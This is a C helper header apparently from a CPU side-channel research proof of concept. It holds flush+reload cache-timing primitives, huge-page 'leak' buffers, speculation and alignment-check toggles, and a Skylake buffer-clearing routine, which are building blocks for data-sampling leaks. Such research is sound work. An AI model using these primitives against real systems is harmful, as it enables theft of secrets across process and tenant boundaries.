#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <ctype.h>

#ifndef ITERS
#define ITERS 10000
#endif

#include <sys/prctl.h>
#ifndef PR_SET_SPECULATION_CTRL
#define PR_SET_SPECULATION_CTRL 53
#endif

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#define ALLOC_BUFFERS()\
	__attribute__((aligned(4096))) size_t results[256] = {0};\
	unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
	if (reloadbuffer == (unsigned char *)-1) perror("did you set /proc/sys/vm/nr_hugepages?");\
	reloadbuffer = reloadbuffer + 0x80;\
	unsigned char *leak = mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 4096;\
	unsigned char *privatebuf = mmap(NULL, 4096*128, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
	(void)privatebuf;

static inline void enable_SSBM() {
        int r = prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0);
        if (r == -1) perror("can't enable SSBM, may be flaky");
}

static inline __attribute__((always_inline)) void enable_alignment_checks() {
	asm volatile(
		"pushf\n"
		"orl $(1<<18), (%rsp)\n"
		"popf\n"
	);
}

static inline __attribute__((always_inline)) void disable_alignment_checks() {
	asm volatile(
		"pushf\n"
		"andl $~(1<<18), (%rsp)\n"
		"popf\n"
	);
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

/* flush all lines of the reloadbuffer */
static inline __attribute__((always_inline)) void flush(unsigned char *reloadbuffer) {
	for (size_t k = 0; k < 256; ++k) {
		size_t x = ((k * 167) + 13) & (0xff);
		volatile void *p = reloadbuffer + x * 1024;
		asm volatile("clflush (%0)\n"::"r"(p));
	}
}

/* update results based on timing of reloads */
static inline __attribute__((always_inline)) void reload(unsigned char *reloadbuffer, size_t *results) {
	asm volatile("mfence\n");
	for (size_t k = 0; k < 256; ++k) {
		size_t x = ((k * 167) + 13) & (0xff);

		unsigned char *p = reloadbuffer + (1024 * x);

		uint64_t t0 = rdtscp();
		*(volatile unsigned char *)p;
		uint64_t dt = rdtscp() - t0;

		if (dt < 160) results[x]++;
	}
}

void print_results(size_t *results) {
	size_t max = 1;
	for (size_t c = 1; c < 256; ++c) {
		if (results[c] > results[max])
			max = c;
		if (c && results[c] >= ITERS/1000) {
			printf("%08zu: %02x (%c)\n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
		}
	}
	if (results[max] && results[max] < ITERS/1000)
		printf("%08zu: %02x (%c)\n", results[max], (unsigned int)max, isprint(max) ? (unsigned int)max : '?');
}

void print_best_results(size_t *results) {
	size_t max = 1;
	for (size_t c = 2; c < 256; ++c) {
		if (results[c] > results[max])
			max = c;
	}
	if (results[max]) {
		printf("%08zu: %02x (%c)\n", results[max], (unsigned int)max, isprint(max) ? (unsigned int)max : '?');
	}
}

/* clear buffers */
void _do_skl_avx()
{
	char zero_ptr[64] = {0};
	char dst[8192] = {0};
	char *dst_ptr = (char *)&dst;

	__asm__ __volatile__ (
		"lfence\n\t"
		"vorpd (%1), %%ymm0, %%ymm0\n\t"
		"vorpd (%1), %%ymm0, %%ymm0\n\t"
		"xorl	%%eax, %%eax\n\t"
		"1:clflushopt 5376(%0,%%rax,8)\n\t"
		"addl	$8, %%eax\n\t"
		"cmpl $8*12, %%eax\n\t"
		"jb 1b\n\t"
		"sfence\n\t"
		"movl	$6144, %%ecx\n\t"
		"xorl	%%eax, %%eax\n\t"
		"rep stosb\n\t"
		"mfence\n\t"
		: "+D" (dst_ptr)
		: "r" (&zero_ptr)
		: "eax", "ecx", "cc", "memory", "ymm0"
	);
}

